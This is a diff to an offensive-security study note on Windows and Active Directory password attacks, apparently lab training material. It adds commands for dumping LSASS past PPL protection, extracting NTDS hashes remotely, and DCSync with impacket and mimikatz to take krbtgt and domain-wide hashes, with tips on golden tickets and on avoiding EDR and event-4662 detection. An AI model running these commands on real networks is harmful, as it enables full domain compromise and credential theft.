@@ -1,6 +1,6 @@
 # Password Attacks
 
-#passwordcracking #passwords #auth #authentication #hashcat #PassTheHash #PassTheTicket #Kerberos #Kerberoasting #ASREPRoasting #Timeroasting #DPAPI #NTDS #LSASS #GPP #CredentialHunting
+#passwordcracking #passwords #auth #authentication #hashcat #PassTheHash #PassTheTicket #Kerberos #Kerberoasting #ASREPRoasting #Timeroasting #DCSync #DPAPI #NTDS #LSASS #PPL #GPP #CredentialHunting
 
 ## What is this?
 
@@ -156,6 +156,8 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 
 > Replace `672` with the actual PID of lsass.
 
+> [!warning] **LSASS is often PPL-protected on modern Windows** (RunAsPPL, default with Credential Guard / on Win11) — `comsvcs MiniDump` and a normal handle-open then fail with **access denied even as SYSTEM**. Options: mimikatz driver unprotect (`!+` then `!processprotect /process:lsass.exe /remove`), a handle-duplication / syscall dumper that evades the block (**nanodump** `--fork`/`--duplicate`, dumpert), or flip `RunAsPPL` in the registry and reboot (noisy). Separately, **Credential Guard** seals secrets in a VBS enclave, so even a clean dump yields **no NTLM/cleartext** for protected creds — pivot to DCSync/roasting instead. `comsvcs` is also EDR-signatured; prefer nanodump on defended hosts.
+
 ### Parse Dump with Pypykatz
 
 ```bash
@@ -252,11 +254,13 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTD
 
 Requires **local admin on the DC**.
 
-### Remote (CrackMapExec)
+### Remote (NetExec / CrackMapExec)
 
 ```bash
-crackmapexec smb 10.129.201.57 -u Administrator -p 'Password123' --ntds
+nxc smb 10.129.201.57 -u Administrator -p 'Password123' --ntds     # (crackmapexec = same flag)
 ```
+
+> [!note] `--ntds` doesn't copy the file — it pulls the hashes over **DRSUAPI replication (= DCSync)**, so it needs replication rights (Administrator has them), not a shell on the DC. It's the DCSync section below, wrapped in one flag.
 
 ### Crack Hashes
 
@@ -265,6 +269,28 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 
 hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+
+---
+
+## Active Directory — DCSync
+
+The domain's hashes without ever touching the DC's disk or getting a shell on it. **DCSync** abuses the directory replication protocol (**MS-DRSR / DRSUAPI `GetNCChanges`**): any principal holding **`DS-Replication-Get-Changes`** + **`DS-Replication-Get-Changes-All`** (defaults: Domain/Enterprise Admins and DCs — but frequently **over-delegated** to service or admin accounts) can ask a DC to replicate **any** account's secrets, including **`krbtgt`** (→ golden ticket). Remote, single-user, one command — the default way to extract domain creds on a real engagement.
+
+```bash
+# impacket — remote, over DRSUAPI (no NTDS.dit copy, no shell on the DC)
+impacket-secretsdump -just-dc-user krbtgt inlanefreight.htb/user:'Pass'@172.16.5.5   # just krbtgt → golden ticket
+impacket-secretsdump -just-dc-ntlm      inlanefreight.htb/user:'Pass'@172.16.5.5     # every account's NTLM
+impacket-secretsdump -just-dc           inlanefreight.htb/user:'Pass'@172.16.5.5     # NTLM + Kerberos keys + cleartext
+impacket-secretsdump -just-dc-ntlm -hashes :<nthash> inlanefreight.htb/user@172.16.5.5   # pass-the-hash instead of pw
+
+# Windows — mimikatz (run as a rights-holding user)
+lsadump::dcsync /domain:inlanefreight.htb /user:krbtgt
+lsadump::dcsync /domain:inlanefreight.htb /all /csv       # whole domain
+```
+
+> [!tip] **Hunt the delegation, don't assume you need DA.** Look in BloodHound for `DCSync`/`GetChanges`+`GetChangesAll` edges to your principal — a single over-permissioned account is a full-domain compromise. Grab `krbtgt` → forge a golden ticket ([[Class notes/HTB Academy/CPTS v2 (claude)/Metasploit|Metasploit]] `forge_ticket`, or [[Services/Active Directory/Kerberos|Kerberos]]); grab a target user → PtH/PtT below.
+
+> [!warning] DCSync from a **non-DC** source generates event **4662** with the replication control-access-right GUIDs (`1131f6aa-…`/`1131f6ad-…`) — a high-signal detection. It's loud on a monitored domain; scope `-just-dc-user` to the one account you need rather than replicating everything.
 
 ---
 
@@ -850,7 +876,9 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 | Crack /etc/shadow | `unshadow passwd.bak shadow.bak > unshadowed.hashes; hashcat -m 1800 unshadowed.hashes rockyou.txt` |
 | Dump SAM (offline) | `impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL` |
 | Dump LSASS via minidump | `rundll32 comsvcs.dll, MiniDump <PID> C:\lsass.dmp full` then `pypykatz lsa minidump lsass.dmp` |
-| Dump NTDS.dit remotely | `crackmapexec smb 10.129.201.57 -u Administrator -p 'Password123' --ntds` |
+| Dump NTDS.dit remotely (DCSync) | `nxc smb 10.129.201.57 -u Administrator -p 'Password123' --ntds` |
+| DCSync just krbtgt (→ golden) | `impacket-secretsdump -just-dc-user krbtgt DOM/user:Pass@<dc-ip>` |
+| DCSync (mimikatz) | `lsadump::dcsync /domain:DOM /user:krbtgt` |
 | Kerberoast | `impacket-GetUserSPNs domain.htb/user:pass -dc-ip <IP> -request -outputfile kb.txt` → `hashcat -m 13100 kb.txt rockyou.txt` |
 | ASREPRoast | `impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt -format hashcat` → `hashcat -m 18200` |
 | Timeroast (computer/trust accts, no creds) | `python3 timeroast.py <dc-ip> -o t.txt` → `hashcat -m 31300 t.txt rockyou.txt` |
@@ -869,5 +897,5 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-31*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
